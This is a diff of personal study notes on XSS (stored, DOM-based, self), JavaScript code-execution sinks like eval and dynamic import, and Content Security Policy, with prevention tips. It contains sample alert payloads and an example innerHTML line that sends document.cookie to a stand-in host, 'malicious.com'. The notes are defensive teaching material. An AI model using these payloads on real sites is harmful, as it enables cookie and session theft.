@@ -247,12 +247,12 @@ XSS/XSS attacks:
                       - Prevent this by:
                         - Escaping html code
                         - Use templating engines, or ssr to escape the values
+
         - Stored XSS
             - Permanent in nature
          ***- XSS payload is injected into the storage of the webserver
               (e.g.) in a database and sent in the HTTP responses. When
               message is read, the payload is executed.
-            
             - E.g.
                 - 1. In a form, where no validation is there, following values are entered
                       name: <script>alert('some name')</script>
@@ -267,21 +267,82 @@ XSS/XSS attacks:
                     and the attack is targeted for that page
                         But, when the attacker doesn't know this, he puts as much as payload
                         everywhere possible, which is called Blind Xss attack
-            - Ways of preventionn:
+            - Prevention tips:
                 - Render using a template engine
                 - Use form validation
                 - Prevent writing weird user input in database directly
 
         - DOM-based XSS:
+            - NOTE: The browser doesn't execute <script> tags that are added with 
+                    inner HTML
+            - NOTE: Images have lower browser limitations than scripts
+            - NOTE: Server side rendering react is by default vulnerable to XSS
+            - NOTE: Vuejs is less explicit
             - Happens when the XSS payload is made executable through a DOM change
             - If REST api returns the XSS payload, it is not directly executable.
               It will need a DOM operation, vulnerability lies in the frontend code
             - These may or maynot be permanent.
+            - E.g.
+                - 1. function fetchUser() {
+                        return Promise.resolve({ firstName: `<img src="aaaa" onerror="alert('hello')"`/> }) 
+                     }
+            - Prevention tips:
+                - Never use exploitable code such as: 'document.innerHTML' in your sourceCode
+                - Don't have code that can use arbitrary urls
+                - Never put yourself in a situation where the user can render html
+                - Don't trust user input or response or local storage or cookie or session storage etc.
+                - Check for any framework in use, which parts are defined vulnerable for 
+                  xss (For e.g. google 'React xss')
 
         - Self XSS:
-            - NOTE: The browser doesn't execute <script> tags that are added with 
-                    inner HTML
+            
             - The victim is tricked into running the XSS payload themselves.
             - Happens through mind-tricks and social engineerings.
               E.g. Someone tells the user to copy/paste code to console to 
                    gain incentives
+
+        - Code execution and other variable sinks:
+            - RCI (Remote Code Injection)
+                - Able to run arbitrary code where the machine is not yours
+            - XSS are subcases (or special hacks) of RCE (Remote Code Execution)
+            - Is there are way to turn arbitrary string to executable javascript?
+                - Have the browser to not execute it directly as a script
+                - Due to use of some code that permit this behaviour:
+                    - E.g. 1. eval('arbitrary code string')
+                           2. new Function('a', 'b', 'return a+b;')
+                           3. const vm = require('vm') // also allows running code
+                           4. Dynamic imports
+                              E.g. const { f } = await import('./url'); f();
+                                   if the url is arbitrary path e.g. from the user 
+                                   but is valid, user can run anything by loading
+                                   arbitrary js, or it may have compacted code
+        
+        - Content Security Policy and XSS:
+            - One of the most powerful way in js to prevent all kind of unfaithful
+              resource loading
+            - Protects against XSS attacks
+            - Helps protect against packet sniffing
+                E.g. By forcing traffic only from https
+            - To specify:
+                - An additional header can be returned in the server response that is
+                  responsible for setting the content security policy
+                  E.g. <Server Response Header>
+                    Content-Security-Policy: <directive><value>;<directive><value>
+                - Specify using HTML5 meta tags:
+                    <meta http-equiv="Content-Security-Policy" content="<directive> <value>; <directive> <value>"
+                  
+            - CSP headers:
+                - script-src 'none';
+                    - Cannot load js by default
+                - Define custom domains allowed:
+                    - script-src 'self' http://*.jquery.com
+                    - This prevents attacks like: 
+                        document.getElementById('any')
+                            .innerHTML = `<img src='https://malicious.com?value=document.cookie'/>`
+                    - report-uri:
+                        - Used to report CSP violations
+                    - CSP can help block inline scripts:
+                        - E.g. script-src 'strict-dynamic' 'sha256-base64EncodedHash'
+                    - CSP can be report only instead of blocking as in above
+                      this can be done by using: 'Content-Security-Policy-Report-Only'
+                    - Helmet CSP (npm library to build CSP policy in a friendly way)
